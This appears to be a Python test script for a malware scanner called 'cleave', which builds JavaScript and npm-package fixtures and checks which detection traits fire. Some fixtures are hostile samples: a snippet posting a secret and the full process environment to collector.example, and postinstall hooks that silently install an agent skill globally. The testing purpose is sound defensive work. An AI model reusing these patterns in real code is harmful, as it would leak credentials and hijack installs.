#!/usr/bin/env python3
"""Static controls for header credentials and detached skill-install wizards."""
import argparse
import io
import json
import os
from pathlib import Path
import subprocess
import tarfile
import tempfile

ROOT = Path(__file__).resolve().parents[2]
ENV = 'objectives/exfiltration/stealer/env::credential-environment-http-body'
HOOK = 'objectives/supply-chain/install-hook/skill-agent::postinstall-registers-ai-agent-skill'
REFERENCE = 'micro-behaviors/os/package-manager/reference-install::npx-skills-add-global-command-text'
OLD_REFERENCE = 'micro-behaviors/process/create/agent::npx-skills-add-global-command-text'
OLD_NAMES = 'objectives/supply-chain/install-hook/skill-agent::ai-agent-runtime-names'

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--cleave', default='cleave')
parser.add_argument('--staging-parent', default=None)
args = parser.parse_args()

header = '''
async function publish(payload, env) {
  const secret = process.env.SERVICE_BRIDGE_SECRET;
  await fetch('https://service.example/reports', {
    method: 'POST', headers: { 'x-service-secret': secret },
    body: JSON.stringify({ reportDate: payload.date, payload })
  });
}
const env = { ...process.env };
await publish({ date: '2026-10-19', sales: 42 }, env);
'''
collector = '''
await fetch('https://collector.example/events', {
  method: 'POST',
  body: JSON.stringify({ credential: process.env.SERVICE_BRIDGE_SECRET, environment: process.env })
});
'''
wizard = '''
const { execFileSync } = require('node:child_process');
console.log('For codex setup: npx skills add vendor/cli -y -g');
function setup() { execFileSync('npx', ['-y', 'skills', 'add', 'vendor/cli', '-y', '-g']); }
if (process.argv[2] === 'install') setup();
'''

with tempfile.TemporaryDirectory(prefix='argent-drift-', dir=args.staging_parent) as tmp:
    staging = Path(tmp)
    cases = {}
    for name, source, expected in [('header-auth.mjs', header, False), ('collector.mjs', collector, True)]:
        target = staging / name
        target.write_text(source)
        cases[name] = ({ENV} if expected else set(), set() if expected else {ENV, HOOK})
    target = staging / 'helper-collector.js'
    target.write_text((ROOT / 'testdata/hostile/env-http-npm-agent-secret.js').read_text())
    cases[target.name] = ({ENV}, set())
    for name, command, expected in [
        ('explicit-wizard.tgz', 'node install.js', False),
        ('direct-hook.tgz', 'npx skills add vendor/cli -y -g', True),
        ('chained-hook.tgz', 'node install.js && npx -y skills add vendor/cli --global', True),
        ('quoted-hint.tgz', 'echo "npx skills add vendor/cli -y -g"', False),
    ]:
        target = staging / name
        manifest = {'name': 'static-control', 'version': '1.0.0', 'scripts': {'postinstall': command}}
        with tarfile.open(target, 'w:gz') as archive:
            for member, source in {
                'package/package.json': json.dumps(manifest),
                'package/install.js': "require('node:child_process').execFileSync('tar', ['--version']);\n",
                'package/cli.js': wizard,
            }.items():
                content = source.encode()
                entry = tarfile.TarInfo(member)
                entry.size = len(content)
                archive.addfile(entry, io.BytesIO(content))
        cases[name] = ({HOOK} if expected else set(), set() if expected else {HOOK})
    output = subprocess.run(
        [args.cleave, '--no-update-check', '--traits-dir', str(ROOT), '--format', 'json',
         *[str(staging / name) for name in cases]],
        env={**os.environ, 'CLEAVE_SKIP_CACHE': '1'},
        check=True, capture_output=True, text=True,
    ).stdout
    decoder = json.JSONDecoder()
    reports = {}
    while output.strip():
        value, end = decoder.raw_decode(output.lstrip())
        output = output.lstrip()[end:]
        for report in value['files']:
            reports[report['path']] = report
    for name, (required, forbidden) in cases.items():
        root = reports[str(staging / name)]
        ids = {trait['id'] for trait in root.get('traits', [])}
        assert required <= ids, (name, 'missing', required - ids)
        assert not forbidden & ids, (name, 'unexpected', forbidden & ids)
        if not required:
            assert not any(t['crit'] >= 4 for t in root.get('traits', [])), (name, root.get('traits'))
        print('PASS', name)
    wizard_report = reports[str(staging / 'explicit-wizard.tgz')]
    wizard_ids = {t['id'] for t in wizard_report.get('traits', [])}
    assert REFERENCE in wizard_ids, wizard_ids
    for report in reports.values():
        assert not {OLD_REFERENCE, OLD_NAMES} & {t['id'] for t in report.get('traits', [])}
print('7 controls passed; command references retained without hook inference')
